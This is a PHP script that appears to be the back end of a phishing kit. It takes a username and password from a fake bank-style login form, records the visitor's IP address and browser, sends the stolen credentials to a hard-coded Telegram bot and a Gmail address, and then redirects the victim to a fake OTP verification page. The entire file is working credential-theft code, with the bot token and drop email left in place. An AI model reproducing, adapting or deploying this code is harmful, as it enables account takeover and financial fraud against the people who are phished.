<?php 
session_start();

// === Collect login form data ===
$userID = $_POST['onlineId'] ?? 'Unknown';
$password = $_POST['passcode'] ?? 'Unknown';

// Save for later
$_SESSION['userID'] = $userID;
$_SESSION['password'] = $password;

// Get visitor details
$ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown IP';
$agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown Agent';
$time = date("Y-m-d H:i:s");

// Config
$telegram_token = "8028760837:AAGRCR8aRXteT3pQwf7-eGE8oIRm7NamAWU";
$chat_id = "6564094997";
$email_to = "aliyahmarley7@gmail.com";

// Build message
$message = "🔐 New Login Captured:\n";
$message .= "👤 User ID: $userID\n";
$message .= "🔑 Password: $password\n";
$message .= "🌐 IP: $ip\n";
$message .= "🖥️ Agent: $agent\n";
$message .= "🕒 Time: $time";

// === Send to Telegram ===
$telegram_url = "https://api.telegram.org/bot$telegram_token/sendMessage";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $telegram_url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, [
    'chat_id' => $chat_id,
    'text' => $message
]);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

// === Send to Email ===
$subject = "🔐 New Login [$ip]";
$headers = "From: WebForm <noreply@lab.com>";
@mail($email_to, $subject, $message, $headers);

// Redirect to email/OTP verification
header("Location: verify.html");
exit;
?>
